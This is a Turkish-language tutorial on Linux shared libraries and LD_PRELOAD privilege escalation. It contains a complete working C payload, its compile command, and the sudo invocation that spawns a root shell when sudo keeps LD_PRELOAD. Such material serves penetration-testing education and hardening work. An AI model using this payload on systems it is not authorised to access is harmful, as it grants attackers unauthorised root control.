Programların dinamik olarak paylaşılan kütüphaneleri kullanması yaygın bir durumdur. Kütüphaneler, geliştiricilerin aynı kod parçalarını birden fazla programda yeniden yazmak zorunda kalmamak için kullandıkları derlenmiş kodlardan oluşur.Linux'ta iki tür kütüphane vardır: statik kütüphaneler (.a dosya uzantısı ile gösterilir) ve dinamik olarak bağlı paylaşılan nesne kütüphaneleri (.so dosya uzantısı ile gösterilir). Bir program derlendiğinde, statik kütüphaneler programın bir parçası haline gelir ve değiştirilemez. Ancak dinamik kütüphaneler, onları çağıran programın yürütülmesini kontrol etmek için değiştirilebilir.

Dinamik kütüphanelerin konumunu belirtmek için birden fazla yöntem vardır. Bir programı derlerken -rpath veya -rpath-link bayraklarını, LD_RUN_PATH veya LD_LIBRARY_PATH çevresel değişkenlerini dinamik kütüphanelerin konumunu belirtmek için kullanabiliriz. Ayrıca dinamik kütüphaneleri /lib veya /usr/lib varsayılan dizinlerine yerleştirebilir veya /etc/ld.so.conf yapılandırma dosyası içinde kütüphaneleri içeren başka bir dizin belirtebiliriz.

Ayrıca, **LD_PRELOAD** ortam değişkeni bir binary dosyayı çalıştırmadan önce bir kütüphane yükleyebilir. Bu kütüphanedeki fonksiyonlar varsayılan fonksiyonlarla değiştirilir.

Bir binary dosyanın çalışması için gereken paylaşılan kütüphaneler **ldd** yardımcı programı kullanılarak görüntülenebilir.

```auto
root💀hackerbox:~# ldd /bin/ping
linux-vdso.so.1 (0x00007ffe891fa000)
libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007f0221bd4000)
libidn2.so.0 => /lib/x86_64-linux-gnu/libidn2.so.0 (0x00007f0221bb3000)
libresolv.so.2 => /lib/x86_64-linux-gnu/libresolv.so.2 (0x00007f0221ba2000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f02219c0000)
libunistring.so.2 => /lib/x86_64-linux-gnu/libunistring.so.2 (0x00007f022183e000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0221c0e000)
```

### LD_PRELOAD Yetki Yükseltme Tekniği

Ayrıcalıkları yükseltmek için LD_PRELOAD ortam değişkenini nasıl kullanabileceğimize dair bir örnek inceleyelim. Bunun için sudo ayrıcalıklarına sahip bir kullanıcıya ihtiyacımız var.

```auto
user@hackerbox:~$ sudo -l
Matching Defaults entries for user on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User user may run the following commands on debian:
    (ALL) NOPASSWD: /usr/local/bin/sys_backup
```

Bu kullanıcının sys_backup programını root olarak çalıştırma hakkı vardır. Ancak bu sys_backup programı GTFOBins'de yoktur ve /etc/sudoers kaydı mutlak yol belirterek yazıldığından, normal koşullar altında ayrıcalıkları yükseltmek için kullanılamaz. Ancak, özel bir paylaşılan kütüphane dosyasını çalıştırmak için LD_PRELOAD ortam değişkeninden yararlanabiliriz.

LD_PRELOAD ortam değişkenini kullanarak yetki yükseltmek için aşağıdaki kodları escalate.c adlı dosyaya kaydedelim.

```auto
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setresuid(0, 0, 0);
system("/bin/bash -p"); 
}
```

Ardından aşağıdaki komutu çalıştırarak kodları derleyelim ve kütüphane çıktısını alalım.

```auto
user@hackerbox:~$ gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c
```

Son olarak aşağıdaki komutu çalıştırarak yetkimizi yükseltebiliriz.

```auto
user@hackerbox:~$ sudo LD_PRELOAD=/tmp/escalate.so /usr/local/bin/sys_backup
root💀hackerbox:~# id
uid=0(root) gid=0(root) groups=0(root)
```
